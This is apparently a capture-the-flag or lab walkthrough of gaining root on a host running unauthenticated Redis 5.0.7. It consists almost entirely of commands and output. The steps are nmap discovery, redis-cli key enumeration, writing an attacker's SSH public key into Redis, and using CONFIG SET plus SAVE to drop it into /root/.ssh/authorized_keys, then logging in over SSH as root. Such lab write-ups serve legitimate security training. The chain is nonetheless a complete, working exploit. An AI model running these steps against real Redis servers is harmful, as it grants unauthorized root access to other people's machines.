### Initial Discovery
```
# Nmap shows Redis
nmap -p 6379 10.10.10.45
# 6379/tcp open  redis

# Connect without password
redis-cli -h 10.10.10.45

# Check info
INFO
# redis_version: 5.0.7
# # Allowed to run commands
```

#### Redis Enumeration
```
# List all keys
KEYS *
# 1) "backup"
# 2) "config"

# Get values
GET backup
# {"ssh_key":"ssh-rsa AAAAB3..."}

# Check config
CONFIG GET *
# dir: /var/lib/redis
# dbfilename: dump.rdb
```

#### Write SSH Key
```
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f redis_key -N ""

# Format key for Redis
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Write to Redis
cat key.txt | redis-cli -h 10.10.10.45 -x set crackit

# Change Redis config to write to .ssh
redis-cli -h 10.10.10.45
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

#### SSH as Root
```
# SSH with private key
ssh -i redis_key root@10.10.10.45

# Root access!
whoami
# root
```

